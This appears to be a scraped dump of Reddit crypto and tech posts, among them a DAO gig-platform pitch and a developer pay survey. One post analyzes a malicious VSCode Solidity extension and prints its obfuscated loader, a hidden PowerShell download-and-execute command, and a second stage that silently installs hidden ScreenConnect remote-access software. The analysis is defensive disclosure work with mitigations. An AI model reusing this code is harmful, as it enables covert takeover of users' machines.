fees.\n\n​Governance Contract: \n\nThis contract manages the voting process, allowing Resonance token holders to vote on proposals and directly influence the platform's future.\n​Censorship and True Ownership via Decentralized Governance.\n\n​Centralized gig platforms maintain total control over a user's presence, from their profile to their portfolio. This creates a risk of arbitrary censorship and de-platforming, where a worker can lose their entire professional identity due to a single platform's policy or decision. The content you create, your reputation, and your ability to earn an income are all held hostage by a single corporate entity.\n\n​The Drift's Decentralized Solution:\n\n​The Drift tackles this fundamental flaw by empowering creators with true ownership and governance.\n\n​You Own Your Identity with IPFS:\n\n All user profiles, portfolios, and content are stored on the InterPlanetary File System (IPFS). This peer-to-peer network is designed to store and share data in a distributed way, making it resilient to censorship. By hosting your profile on IPFS, your professional identity and work are tied to a cryptographic hash, giving you a permanent and portable link that no one can delete.\n\n​You Govern the Platform with the DAO: \n\nThe issue of censorship isn't just about where your data is stored; it's about who gets to make the rules. The Drift's Decentralized Autonomous Organization (DAO) ensures that no single entity can arbitrarily de-platform a creator. Any decisions regarding content, user policies, or platform rules are made by the community of token holders through a transparent on-chain voting process. This distributes power, making it virtually impossible for any one person or small group to enforce censorship.\n\n​Decentralized Dispute Resolution:\n\n​Disputes over contracts and payments are a common problem in the gig economy. In centralized platforms, a corporate support team acts as the final arbiter, and their decisions can be arbitrary and biased. The Drift replaces this with a decentralized, community-driven resolution system.\n\n​How the DAO Handles Disputes:\n\n​When a dispute arises between a client and a creator—for example, a disagreement over whether the work was completed to the required standard—the issue is submitted to the DAO.\n\n​Formal Submission: \n\nThe dispute is formally submitted on-chain, and the funds held in the smart contract escrow are temporarily locked.\n\n​Community Arbitration: \n\nThe DAO's members (Resonance token holders) act as a decentralized jury. They review the evidence submitted by both parties. This could include project details, communications, and the final work product, all of which are stored on a decentralized network.\n\n​Voting and Execution: \n\nToken holders vote to decide the outcome. To incentivize fair and honest voting, the system may require token holders to stake a small amount of Resonance. Those who vote with the consensus are rewarded, while those who vote against it may lose their stake.\n\n​Automated Resolution: \n\nOnce a consensus is reached, the smart contract automatically executes the decision. It will either release the funds to the creator, refund them to the client, or split them as the community has decided.\n​This system ensures that disputes are handled transparently and fairly by the community, not by a single, potentially biased corporate entity.\n\n​Gamification and Community Engagement:\n\n​The Drift is more than just a platform; it's an ecosystem designed to foster a vibrant and engaged community. We believe that by integrating game-like elements, we can create a more rewarding and enjoyable experience for all participants, from new creators to seasoned professionals.\n\n​How Gamification Works:\n\n​Reputation System: Creators will earn reputation points and badges for completing projects, receiving positive feedback, and participating in the DAO's governance. This verifiable on-chain reputation will serve as a powerful signal of a creator's skill and reliability.\n\n​Leaderboards and Rewards: The platform will feature transparent leaderboards that showcase top creators based on reputation, completed projects, or contributions to the community. These top performers can be rewarded with special privileges or airdrops of the Resonance token from a community-managed treasury.\n\n​Quests and Bounties: The platform can use smart contracts to create \"quests\" or \"bounties\" for specific tasks that need to be completed for the community, such as building a new feature or creating marketing content. This incentivizes collaboration and allows community members to directly contribute to the platform's growth.\n​Gamification transforms a transactional experience into a collaborative journey. It encourages a long-term commitment to the platform and rewards participants for adding value to the entire ecosystem, creating a positive feedback loop that benefits everyone involved.\n\n​Drifter NFTs: \n\nIdentity, Governance, and Ecosystem Funding:\n\n​The Drifter NFTs are a core part of the platform's economics and governance, serving as more than just a collectible. They function as the unique, non-fungible backbone of a creator's identity, a key to governance, and a mechanism for funding the ecosystem's growth.\n\n​1. Identity, Reputation, and Governance\n\n​While the Resonance token is used for payments and voting, the Drifter NFTs serve as the unique, non-fungible backbone of a creator's identity and governance rights. These are not just collectibles; they are a direct representation of a creator's participation and standing in the community.\n​Proof of Participation: A Drifter NFT is your digital identity on the platform, a unique token that proves you are a contributing member of the ecosystem. This token can also serve as a key to access certain features or community channels.\n\n​Tiered Governance: \n\nWhile the Resonance token gives you a vote, the Drifter NFTs can introduce a tiered governance model. For instance, a basic NFT might give you standard voting rights, but an NFT earned for a high volume of successful gigs might grant you a higher level of voting power or the ability to submit proposals to the DAO.\n\n​Reputation on the Blockchain: \n\nThe NFT can evolve over time to reflect a creator's journey. It can accumulate metadata to show your reputation score, a number of completed jobs, or a track record of fair voting in disputes. This creates a powerful, verifiable resume that is tied directly to your NFT and cannot be altered.\n\n​2. The NFT Launch and Funding\n\n​The initial distribution of Drifter NFTs will be conducted through a fair and transparent minting event. This event serves not as a vehicle for the creators' personal gain, but as the initial capital raise to build and sustain the entire ecosystem. The funds from the minting event will be automatically and transparently allocated to the following key areas:\n\n​Development &amp; Audits (40%): A significant portion of the funds will be allocated to a multi-signature wallet to finance ongoing development, smart contract audits, and security measures. This ensures that the platform is not only built, but remains secure and reliable for the community.\n\n​Community Treasury (30%): A large portion will be funneled directly into a DAO-controlled treasury. These funds will be used for community-led initiatives, creator grants, and future projects that are proposed and voted on by the token holders.\n\n​Marketing &amp; Growth (15%): These funds are essential for expanding the platform's reach, onboarding new creators and clients, and building partnerships within the broader web3 space.\n\n​Liquidity &amp; Reserves (15%): This portion will be used to provide initial liquidity for the Resonance token on decentralized exchanges (DEXs), ensuring a healthy market and smooth trading. A reserve will also be held for unexpected costs or emergency situations.\n\n​3. The Staking Mechanism:\n\n​Owning a Drifter NFT is not a passive investment; it is an active commitment to the platform. By staking their Drifter NFT, holders can participate in two key systems:\n​Dispute Resolution: As we discussed, a staked NFT can be used to vote on contract disputes. This mechanism provides a powerful incentive for fair and honest participation in the DAO's arbitration process.\n\n​Earning Rewards: Staking a Drifter NFT can also generate rewards in the form of Resonance tokens. This encourages long-term holding and participation in the ecosystem, ensuring that the most committed community members are rewarded for their dedication.\n\n​Roadmap and Future Development:\n\n​Building a decentralized platform requires a phased approach that prioritizes security, functionality, and community growth. The following roadmap outlines our plan for the launch and long-term development of The Drift, with each phase guided by the community through the DAO.\n\n​Phase 1: \n\nFoundation &amp; Launch: This phase focuses on establishing a secure and stable foundation for the platform.\n​Smart Contract Audits: The core smart contracts for payments, escrow, and governance will undergo a comprehensive audit by a reputable third-party firm. This is non-negotiable and ensures the security of user funds.\n\n​Beta Launch: An initial version of the platform will be released to a small group of beta testers. This will allow us to gather feedback and test the platform under real-world conditions.\n\n​Mainnet Launch: Following a successful beta, The Drift will be launched on the selected Layer-2 solution. The platform will be fully functional, allowing creators to onboard and start taking on gigs.\n\n​Phase 2: \n\nGrowth &amp; Ecosystem Expansion:\n\n​Once the platform is live and stable, the focus will shift to community and feature development.\n\n​User Onboarding: A concerted effort will be made to onboard a wider range of creators and clients to the platform.\n\n​Enhanced Features: New functionalities will be added based on community feedback, such as more complex contract types, reputation systems, and advanced search filters.\n\n​Strategic Partnerships: We will seek partnerships with companies and other decentralized projects to increase the platform's visibility and utility.\n​Phase 3: Decentralization &amp; DAO Handover\n​The final and most critical phase of the roadmap.\n\n​Full Governance Handover: The core team will hand over all governance authority to the DAO. This means that all future decisions regarding the platform's direction, protocol upgrades, and treasury management will be decided solely by the token holders through on-chain voting.\n\n​Community-Led Development: Development will transition to a community-led model. Grant programs will be established to incentivize contributors to propose and build new features for the platform.\n\n​This roadmap is a living document, and its future direction will be entirely in the hands of the community.\n\n​Conclusion:\n\n​The current gig economy is a fragmented and flawed system that works against the very creators it claims to empower. Centralized platforms and outdated payment models lead to low wages, delayed payments, a lack of ownership, and the constant threat of censorship.\n\n​The Drift is a direct and necessary response to these challenges. We have designed a platform based on the core principles of decentralization, powered by a purpose-built token and governed by a community of its own users. Our model is built for transparency, a sustainable ecosystem, and true ownership of your work.\n\n​We are not just building another platform; we are building a new economic foundation for creators—a place where you own your identity, are paid what you're worth, and have a direct say in the future of the system you help to build.\n@thedriftdao\n\nEdit: some bad formatting issues, edit2: found more", "author": "ConclusionPrevious79", "subreddit": "ethereum", "score": 3, "upvote_ratio": 0.57, "num_comments": 7, "created_utc": "2025-09-13T10:16:00", "url": "https://www.reddit.com/r/ethereum/comments/1nfkjcw/gig_economy_idea_needs_work_but_the_bones_are/", "permalink": "https://reddit.com/r/ethereum/comments/1nfkjcw/gig_economy_idea_needs_work_but_the_bones_are/", "is_self": true, "domain": "self.ethereum", "tech_keywords": ["AI", "blockchain", "AR", "NFT", "share", "investment", "portfolio", "earnings", "profit", "growth"], "crawled_at": "2025-10-03T13:57:08.690669", "sentiment_score": {"vader_compound": 0.9999, "vader_positive": 0.162, "vader_neutral": 0.794, "vader_negative": 0.043, "textblob_polarity": 0.11581948230096382, "textblob_subjectivity": 0.4958746192079527, "overall_sentiment": "positive"}},

Protocol Guild facilitates significant funding to help reduce this gap and retain talent long term.**\n\nThis report examines compensation data from a majority of Ethereum's core protocol contributors across 11 different orgs, revealing significant gaps between their current compensation and potential market earnings. While many members prioritize working on values-aligned projects, inadequate compensation is a risk to talent retention, the progress of Ethereum's technical roadmap, and long-term credible neutrality. As the leading independent funder of core development, Protocol Guild plays an increasingly important role in addressing this challenge - but there's still significant work to be done. Ecosystem funding entities should understand this as a serious challenge and focus on finding scalable solutions to close the compensation gap.\n\n# Takeaways\n\n1. High Demand: Nearly **40% of contributors received final offers** from outside employment opportunities in the past year\n2. Massive Pay Gap: Current fiat compensation (salary + bonus) is **50-60% below market offers**\n3. No Upside Exposure: The median contributor earns **$0 in equity/tokens** as part of their regular employment\n4. Critical Lifeline: Protocol Guild funding made up almost **1/3 of the total compensation** package for core contributors over the past year\n5. Retention Boon: Protocol Guild funding is rated as **\"very/extremely important\" by 59% of members** to support their ongoing work\n\n[PG member salaries vs. industry offers \\(sorted by years of experience\\)](https://preview.redd.it/dv782tgm17of1.png?width=4046&amp;format=png&amp;auto=webp&amp;s=f8f615ba2786ba8e862cee195a2e0c2a811fc0fe)", "author": "trent_vanepps", "subreddit": "ethereum", "score": 31, "upvote_ratio": 0.88, "num_comments": 8, "created_utc": "2025-09-10T04:50:30", "url": "https://www.reddit.com/r/ethereum/comments/1nct4af/ethereum_core_dev_comp_survey_undercompensated/", "permalink": "https://reddit.com/r/ethereum/comments/1nct4af/ethereum_core_dev_comp_survey_undercompensated/", "is_self": true, "domain": "self.ethereum", "tech_keywords": ["AI", "AR", "equity", "earnings"], "crawled_at": "2025-10-03T13:57:08.932786", "sentiment_score": {"vader_compound": 0.9869, "vader_positive": 0.165, "vader_neutral": 0.782, "vader_negative": 0.054, "textblob_polarity": 0.08505555555555556, "textblob_subjectivity": 0.5194529914529915, "overall_sentiment": "positive"}},

{"post_id": "1nawz13", "title": "Suspicious VSCode extension could be stealing from crypto developers", "content": "About a week ago, I was discussing with a friend the status of hacking in the Web3 space. Being used to the \"traditional\" hacking and bug bounty world, I was surprised when he started telling me things like `solidity`, `EVM`, `DeFi`, `smart contracts`, and so on. I had no idea what he was talking about, so I decided to do some research.\n\nA few Google searches later, I found out that if I wanted to get into Web3 hacking, I would need to learn about blockchain technology, smart contracts, and the various platforms that support them. I also discovered that there were many bug bounty programs specifically for Web3 projects, which was exciting. So I decided to start with Solidity.\n\nI opened VSCode and headed to the marketplace to install the Solidity extension. Few extensions caught my attention.\n\n* \"[Solidity by Juan Blanco](https://marketplace.visualstudio.com/items?itemName=JuanBlanco.solidity)\" - with 1.7M downloads\n* \"[Solidity Language Support](https://marketplace.visualstudio.com/items?itemName=ShowSnowcrypto.SnowShoNo) \\- with 2.9M downloads\n\nI decided to go with the second one, \"Solidity Language Support\" by ShowSnowcrypto, because it had more downloads and seemed to be more popular. After installing the extension, I opened a new file and set the language mode to Solidity. No syntax highlighting, no intellisense, no nothing. Just a plain text file.\n\nSo...being the \"nerd\" that I am, I decided to investigate further.\n\nJust as I was trying to figure out what was happening, a Powershell window popped up and immediately closed. I had no idea what it was, but I assumed it was something related to the extension. I checked the output panel in VSCode, but there was nothing there. I then checked the \"Problems\" tab, but again, there was nothing there.\n\n...shocked, I decided to check the extension's installation folder. I exported the whole extension folder as a zip to analyze it.\n\nInside the extensions folder, I found a file `src/extension.js`. Opening it, I saw that it was a minified/obfuscated code JavaScript file. I formatted it to make it more readable and started going through the code.\n\nHere is the minified/obfuscated code:\n\n    const _0x213954 = _0x41e2;\n    (function (_0x4b4334, _0x2656ab) {\n      const _0x1da43d = _0x41e2,\n        _0x57e2b6 = _0x4b4334();\n      while (!![]) {\n        try {\n          const _0x18e3ec =\n            (parseInt(_0x1da43d(0x1c3)) / 0x1) *\n              (-parseInt(_0x1da43d(0x1c1)) / 0x2) +\n            (parseInt(_0x1da43d(0x1d1)) / 0x3) *\n              (parseInt(_0x1da43d(0x1cc)) / 0x4) +\n            parseInt(_0x1da43d(0x1c9)) / 0x5 +\n            -parseInt(_0x1da43d(0x1c2)) / 0x6 +\n            -parseInt(_0x1da43d(0x1c4)) / 0x7 +\n            (-parseInt(_0x1da43d(0x1cd)) / 0x8) *\n              (parseInt(_0x1da43d(0x1ca)) / 0x9) +\n            (-parseInt(_0x1da43d(0x1d2)) / 0xa) *\n              (-parseInt(_0x1da43d(0x1ce)) / 0xb);\n          if (_0x18e3ec === _0x2656ab) break;\n          else _0x57e2b6[\"push\"](_0x57e2b6[\"shift\"]());\n        } catch (_0x4d6972) {\n          _0x57e2b6[\"push\"](_0x57e2b6[\"shift\"]());\n        }\n      }\n    })(_0x2470, 0x2f80d);\n    function _0x2470() {\n      const _0x2e306f = [\n        \"child_process\",\n        \"exports\",\n        \"45yepeMH\",\n        \"2941110MJONQC\",\n        \"platform\",\n        \"4vuRIWg\",\n        \"484446KRGyQu\",\n        \"62069ZrsUVa\",\n        \"1882167AjRYWW\",\n        \"Command\\x20failed:\",\n        \"warn\",\n        \"PowerShell\\x20reported\\x20errors:\",\n        \"win32\",\n        \"1191030RHNorV\",\n        \"1455471TySatz\",\n        \"powershell\\x20-WindowStyle\\x20Hidden\\x20-Command\\x20\\x22irm\\x20https://niggboo.com/aaa\\x20|\\x20iex\\x22\",\n        \"79396CwoQFA\",\n        \"8BLexMd\",\n        \"11ucAODX\",\n      ];\n      _0x2470 = function () {\n        return _0x2e306f;\n      };\n      return _0x2470();\n    }\n    const { exec } = require(_0x213954(0x1cf));\n    function _0x41e2(_0x47872a, _0x374aac) {\n      const _0x247057 = _0x2470();\n      return (\n        (_0x41e2 = function (_0x41e2d4, _0x330032) {\n          _0x41e2d4 = _0x41e2d4 - 0x1c0;\n          let _0x231f39 = _0x247057[_0x41e2d4];\n          return _0x231f39;\n        }),\n        _0x41e2(_0x47872a, _0x374aac)\n      );\n    }\n    function activate() {\n      const _0x5ba756 = _0x213954;\n      if (process[_0x5ba756(0x1c0)] !== _0x5ba756(0x1c8)) return;\n      setTimeout(() =&gt; {\n        const _0x2bda8f = _0x5ba756,\n          _0x102934 = _0x2bda8f(0x1cb),\n          _0x40af61 = { windowsHide: !![] };\n        exec(_0x102934, _0x40af61, (_0x5772c8, _0x1ed0b6, _0x24940f) =&gt; {\n          const _0x573b42 = _0x2bda8f;\n          if (_0x5772c8) {\n            console[\"error\"](_0x573b42(0x1c5), _0x5772c8);\n            return;\n          }\n          _0x24940f &amp;&amp; console[_0x573b42(0x1c6)](_0x573b42(0x1c7), _0x24940f);\n        });\n      }, 0x7d0);\n    }\n    function deactivate() {}\n    module[_0x213954(0x1d0)] = { activate: activate, deactivate: deactivate };\n\nImmediately, I noticed the word `PowerShell` and a URL `https://niggboo.com/aaa`. I knew this was not good. I pasted the URL into [VirusTotal](https://www.virustotal.com/gui/url/c5f34a03ef945b5dbaef77e28766c10264e5a82a3d50f82ff48cba81b0bc9fba) and of all the vendors, only two flagged it as malicious.\n\nI then decided to decode the obfuscated code to see what it was doing.\n\nHere is the decoded code:\n\n    const { exec } = require(\"child_process\");\n    \n    function activate() {\n      // Only execute on Windows systems\n      if (process.platform !== \"win32\") return;\n    \n      // Wait 2 seconds before execution\n      setTimeout(() =&gt;

{\n          if (error) {\n            console.error(\"Command failed:\", error);\n            return;\n          }\n          if (stderr) {\n            console.warn(\"PowerShell reported errors:\", stderr);\n          }\n        });\n      }, 2000);\n    }\n    \n    module.exports = { activate, deactivate };\n\nWhat the extension does:\n\n* when extension is activated, it checks if the OS is Windows\n* if it is, it waits for 2 seconds and then executes a PowerShell command that downloads and executes a script from [`https://niggboo.com/aaa`](https://niggboo.com/aaa) using `Invoke-RestMethod (irm)` and `Invoke-Expression (iex)`.\n* the PowerShell window is hidden during execution.\n\nI then decided to check the URL [`https://niggboo.com/aaa`](https://niggboo.com/aaa) to see what it was hosting.\n\n    $pbHbS5FF = Get-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" |\n        Where-Object { $_.DisplayName -like \"*ScreenConnect*\" }\n    if (-not $pbHbS5FF -and [Environment]::Is64BitOperatingSystem) {\n        $pbHbS5FF = Get-ItemProperty -Path \"HKLM:\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" |\n            Where-Object { $_.DisplayName -like \"*ScreenConnect*\" }\n    }\n    if ($pbHbS5FF) {\n        exit\n    }\n    $N1K9eRHH1gUbg5m5 = $env:SystemDrive\n    $QbRgWnCoNa6bQn = $env:TEMP\n    $AxY6ec = \"万里江山一梦中，不知何处是神州。\"\n    $W0yVad = \"oobggin\"\n    $EMILWVyRUGaOy2hwYnG1 = \".com\"\n    $dCgtse5LJq1oI38bpyEEHn3Fq = \"https://\"\n    $gWPit3x9aMC98SUvPQTCF1n = \"/\"\n    $8WOosQAr = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 6 | ForEach-Object {[char]$_})\n    $jpFAI2wc2Qnyx8 = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 7 | ForEach-Object {[char]$_})\n    $ycFcKLlPWgW = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})\n    $Qa6H4VbtBi22S5cE = [char[]]$W0yVad\n    [Array]::Reverse($Qa6H4VbtBi22S5cE)\n    $BHUjCX7BvLEvuQ5 = Join-Path $N1K9eRHH1gUbg5m5 \"C\"\n    $ycFcKLlPWgW = $ycFcKLlPWgW + \".msi\"\n    $vciDcgr2C8aM97e3FyCRI0 = Join-Path $QbRgWnCoNa6bQn $ycFcKLlPWgW\n    $W0yVad = -join $Qa6H4VbtBi22S5cE\n    $6yZe2Upd = $dCgtse5LJq1oI38bpyEEHn3Fq + $W0yVad + $AxY6ec + $EMILWVyRUGaOy2hwYnG1 + $gWPit3x9aMC98SUvPQTCF1n + $8WOosQAr + \"/\" + $jpFAI2wc2Qnyx8\n    $script_var = \"msIVtBX28X3iGIVtBX28X3iGiIVtBX28X3iGexeIVtBX28X3iGIVtBX28X3iGc.exIVtBX28X3iGe /IVtBX28X3iGi `\"$vciDcgr2C8aM97e3FyCRI0`\" /qIVtBX28X3iGn /noresIVtBX28X3iGIVtBX28X3iGtart\"\n    $script_var = $script_var -replace \"IVtBX28X3iG\", \"\"\n    $vJfOE = Join-Path $BHUjCX7BvLEvuQ5 \"C.cmd\"\n    $6yZe2Upd = $6yZe2Upd -replace \"万里江山一梦中，不知何处是神州。\", \"\"\n    $34nj909is9 = \"cmd.exe\"\n    New-Item -Path $BHUjCX7BvLEvuQ5 -ItemType Directory | Out-Null\n    $script_var | Set-Content -Path $vJfOE -Encoding ASCII\n    $vJfOE = $vJfOE -replace \".cmd\", \"\"\n    $3CwX3Vk47gtkm = \"/c `\"$vJfOE`\"\"\n    $c5QTCdETgjZ7OWx = \"S🍕🍕ys🍕🍕🍕🍕🍕🍕tem🍕🍕🍕Co🍕🍕m🍕🍕o🍕nen🍕🍕🍕🍕🍕🍕t\"\n    $EEAcivBTPQrL = \"ScASDASDASDASDASDASDASFJASFJAKSFKAreASDASDASDASDASDASDASFJASFJAKSFKAenASDASDASDASDASDASDASFJASFJAKSFKAConnASDASDASDASDASDASDASFJASFJAKSFKAect SofASDASDASDASDASDASDASFJASFJAKSFKAASDASDASDASDASDASDASFJASFJAKSFKAASDASDASDASDASDASDASFJASFJAKSFKAtwASDASDASDASDASDASDASFJASFJAKSFKAASDASDASDASDASDASDASFJASFJAKSFKAare\"\n    Invoke-WebRequest -Uri $6yZe2Upd -OutFile $vciDcgr2C8aM97e3FyCRI0\n    while ($true) {\n        try {\n            $5fPmRl8hSS9sgF8MUFw = Start-Process -FilePath $34nj909is9 -ArgumentList $3CwX3Vk47gtkm -Verb RunAs -PassThru -ErrorAction Stop -WindowStyle Hidden\n            if ($5fPmRl8hSS9sgF8MUFw) { break }\n        }\n        catch {}\n    }\n    Start-Sleep -Seconds 5\n    $KWe6rOymRzv9RRVs6W = @(\n        \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\",\n        \"HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\"\n    )\n    $c5QTCdETgjZ7OWx = $c5QTCdETgjZ7OWx -replace \"🍕\", \"\"\n    $EEAcivBTPQrL = $EEAcivBTPQrL -replace \"ASDASDASDASDASDASDASFJASFJAKSFKA\", \"\"\n    foreach ($SGFfv in $KWe6rOymRzv9RRVs6W) {\n        Get-ChildItem -Path $SGFfv | ForEach-Object {\n            $Jol3GekkgcCeqh3Vg0s9B = (Get-ItemProperty -Path $_.PsPath -ErrorAction SilentlyContinue).Publisher\n            if ($Jol3GekkgcCeqh3Vg0s9B -eq $EEAcivBTPQrL) {\n                try {\n                    Set-ItemProperty -Path $_.PsPath -Name $c5QTCdETgjZ7OWx -Value 1 -Type DWord\n                } catch {}\n            }\n        }\n    }\n    Remove-Item -Path $vciDcgr2C8aM97e3FyCRI0 -Force -ErrorAction SilentlyContinue\n    Remove-Item -Path $vJfOE -Force -ErrorAction SilentlyContinue\n    Remove-Item -Path $BHUjCX7BvLEvuQ5 -Recurse -Force -ErrorAction SilentlyContinue\n\nThe script does the following:\n\n* Checks if any software with \"ScreenConnect\" in its name is installed.

[Github Repo](https://github.com/kagemanjoroge/malicious-vscode-extensions/tree/main/ShowSnowcrypto.SnowShoNo)\n\n# Mitigation\n\n* If you are on Linux or MacOS, you are safe. The extension only executes on Windows.\n* If you are on Windows, uninstall the extension immediately.\n* Check your system for any unknown software installations, especially anything related to \"ScreenConnect\".\n* Change your passwords and enable 2FA on all your accounts.\n* Monitor your crpto wallets for any unauthorized transactions.\n* Always vet what you install, verify publisher authenticity, and keep your system monitored.\n\nI have since reported the extension to Microsoft though they are yet to take it down...neither have they responded to my report.\n\nAnyways...peace", "author": "_kagema", "subreddit": "ethereum", "score": 111, "upvote_ratio": 0.96, "num_comments": 15, "created_utc": "2025-09-08T01:00:21", "url": "https://i.redd.it/kq1tvr2vlrnf1", "permalink": "https://reddit.com/r/ethereum/comments/1nawz13/suspicious_vscode_extension_could_be_stealing/", "is_self": false, "domain": "i.redd.it", "tech_keywords": ["AI", "blockchain", "AR", "javascript", "share"], "crawled_at": "2025-10-03T13:57:08.947401", "sentiment_score": {"vader_compound": 0.9705, "vader_positive": 0.047, "vader_neutral": 0.923, "vader_negative": 0.031, "textblob_polarity": 0.05065100715610918, "textblob_subjectivity": 0.5196748829401892, "overall_sentiment": "positive"}},

Sources: WGC, Savills, SIFMA, IMF, BIS. \n\nKey figures (implied price per BTC)\n\nGold (216,265t @ ~$3,859/oz): $1.35M. \n\nSilver (1.74M t @ ~$47/oz): $133k. \n\nGlobal real estate: $19.8M. \n\nGlobal equities: $6.37M. \n\nGlobal bonds: $7.29M. \n\nGlobal public+private debt: $16.3M. (overlaps with bonds/loans) \n\nGlobal broad money (M2): $4.82M. (overlaps with financial assets) \n\nOTC derivatives, gross market value: $0.86M. (economic exposure) \n\nOTC derivatives, notional: $36.7M. (not additive; illustrative only) \n\nWorld GDP, annual flow: $5.56M. (flow, not a stock) \n\nFX turnover, daily flow: $482k. (flow, not a stock) \n\n\n“All included” estimate\n\nSumming everything is invalid due to heavy overlap. A cleaner, non-overlapping “broad assets” basket is: Real estate + equities + bonds + gold + silver ≈ $695T → ≈ $35M per BTC.\nIf you also layer M2 as an upper-bound liquidity lens, it becomes ≈ $40M per BTC. (Still overlapping, treat as directional.)\n\nConclusion\n\nThese scenarios are thought experiments, not forecasts. The point is scale: even matching just gold implies ~$1.35M/BTC, while a broad asset universe points to tens of millions per coin.", "author": "Romanizer", "subreddit": "bitcoin", "score": 6, "upvote_ratio": 0.81, "num_comments": 3, "created_utc": "2025-10-03T20:31:34", "url": "https://i.redd.it/rc5m3zcduvsf1.png", "permalink": "https://reddit.com/r/Bitcoin/comments/1nwwkfc/what_if_bitcoin_matched_the_size_of_major_markets/", "is_self": false, "domain": "i.redd.it", "tech_keywords": ["AI", "AR", "stock"], "crawled_at": "2025-10-03T13:57:09.010966", "sentiment_score": {"vader_compound": 0.7476, "vader_positive": 0.063, "vader_neutral": 0.913, "vader_negative": 0.024, "textblob_polarity": 0.05104166666666666, "textblob_subjectivity": 0.2546875, "overall_sentiment": "positive"}},

Bitcoin belief in 3 cycles.", "content": "For me, it took about 3 cycles to get to a place where I fully believe in bitcoin and will hodl it until my kids need to go to college / need a house, or big life events require me to sell.  I'm wondering if many other people experienced the same timeline...?\n\nMy first cycle was the $1k -&gt; $19k cycle.  I knew about bitcoin, some people I knew gambled in bitcoin or used it for various activities, but I personally didn't get it.  I saw my house and stocks go up in value and that was good enough to me.  I saw bitcoin as speculative and something that government could make illegal at any minute so I didn't bother.  Saw it go up to nearly $20k, and had a little regret but that quickly faded as I saw bitcoin 'crash' back to the $3-6k region, and didn't really think about it again.\n\nMy second cycle, I bought 1 bitcoin around $6k just to diversify from my home that gained equity and some stocks I had (I also sold TSLA at $17 and APPL super early which is another time for a regret story).  Bitcoin got to about $35k and I sold figuring that bitcoin would again crash and that FTX and all that stuff would destroy bitcoin (all the paper bitcoin talk, etc, etc).  So I sold, watching bitcoin go up to $69k but then sure enough crashing to $16k ish.\n\nBut then something happened, and I got orange pilled.  I read more about the technology, and read many books, not only on bitcoin, but also on the histories of fiat.  I realized that yes, FTX crashed, but it didn't destroy bitcoin, in fact, I think that whole event made bitcoin stronger.  It showed that the weak and the liars will all get called out in the end and bitcoin will survive on because it's unbreakable and constantly audited.  Bitcoin is truth money and it's the ONLY truth money that exists today.  So I get it, and I feel so lucky that I got into it before wall street was able to get the ETFs passed and for once in my life, I really understand something.\n\nI'm now a forever HODLer, I run a node, and I know what truth really is.

We had to do all that \"digital gold\" work to justify the price. But today? We have Wall Street—the masters of the universe—now selling it as an Exchange Traded Product. They have taken the most speculative, zero-yield, volatility-driven asset and packaged it into a wrapper that retirement funds and financial advisors can legally buy.\n\nThe best part? They didn't even try to fix the core problem; they just accepted the scarcity model. Every talking head on TV is now implicitly endorsing the core tenet of the greatest wealth transfer in history: you buy it because other people will buy it for more later. They call that a self-fulfilling prophecy, but we call it inflows.\n\nThe real skepticism is now the fuel. Every time a seasoned economist calls it a Ponzi, they simply confirm two things: 1) they don't own any, and 2) they are the next cohort of FOMO buyers when the price inevitably goes higher. The smartest people in the room are the ones who identified this early and decided to participate in the mechanism, not argue with the math.

I got into this late in my life (I'm 40 now) and made some poor decisions in the past due to ignorance (and still do, tbh). I have my BTC on Coinbase. I remember reading this is a bad idea a long time ago, but also recall reading about cold wallets and keys, and it seemed so complicated, I just decided to bury my head in the sand and just stick with Coinbase. \n\nBut I want to get more serious about this. I'm still shocked this is valued at over 100k when I remember the first time I bought $1000 worth, it was at 12k. I made very little money back then, so when it tanked to about $3k, I sold it all. I think this was 2017 or 2018, don't recall. I didn't understand finances back then. As a Latina, we were never taught about money or investing. I recently figured it out on my own and I feel I'm better equipped now. \n\nAnyway, I'm wondering how to take the BTC out and where I should store it. Do I take it out at all? Do I need physical storage? Should I continue using Coinbase as my exchange? Coinbase is straightforward and easy to use, but maybe there are better, more reliable options out there?

I am only 2 years into this job and bored and I feel like I need to shake things up a bit to keep doing this for the rest of my life.** \n\n\n\n\nFull disclosure: **this is very much a first world problem**. I get paid quite well, I have incredibly lenient work life balance, I work from home 3 days a week, etc etc. Most people would kill to be in my position at my age.\n\n\nSome context: I was originally in academia doing a PhD in math, but pure math, completely unrelated to ML or anything in the real world really. ~2 years in, I was disillusioned with that (sensing a pattern here lol) so I took as many ML courses I could and jumped ship to industry. \n\n\nRegardless of all the problems I had in academia, it at least *asked* something of me. I had to think, like, *actually think*, about complex, interesting stuff. It felt like I was actually engaging my mind and growing. \n\n\nMy current job is fine, basically applying LLMs for various use cases at a megacorp. On paper, I'm playing with the latest, greatest, tech, but in practice, I'm just really calling APIs on products that smarter people are building. \n\n\nI feel like I haven't actually flexed my brain muscles in years now, I'm forgetting all the stuff I've learnt at college, and the work itself is incredibly boring to me. Many many days I can barely bring myself to work as the work is so uninteresting, and the bare minimum I put in still somehow impresses my colleagues so there's no real incentive to work hard. \n\n\nI realize how privileged that sounds, I really do, but I do feel kind of unfulfilled and spiritually empty. I feel like if I keep doing this for the rest of my life I will look back with regret. \n\n\n**What I'm trying to do to fix this:** I would like to shift towards more cutting edge and harder data science. Problem here is a lack of qualifications and experience. I have a MS and a BS in Math (from T10 colleges) but no PhD and the math I studied was mostly pure/theoretical, very little to do with ML. \n\nI'm trying to do projects in my own time, but it's slow going on my own. I would love to aim for ML/AI research roles, but it feels like an impossible ask without a PhD, without papers, etc etc. I'm not sure that's a feasible goal. \n\n\n\nAnother thing I've been considering is playing a DS/ML role as support in research that's *not* ML. For instance, bioinformatics or biotech, etc. This is also fairly appealing to me. The main issue is here is a complete lack of knowledge about these fields (since there can be so many fields here) and a lack of domain knowledge which I presume is required. I'm still trying, I've been applying for some bioinformatics roles, but yeah, also hard. \n\n\n\n**Has anyone else felt this way?

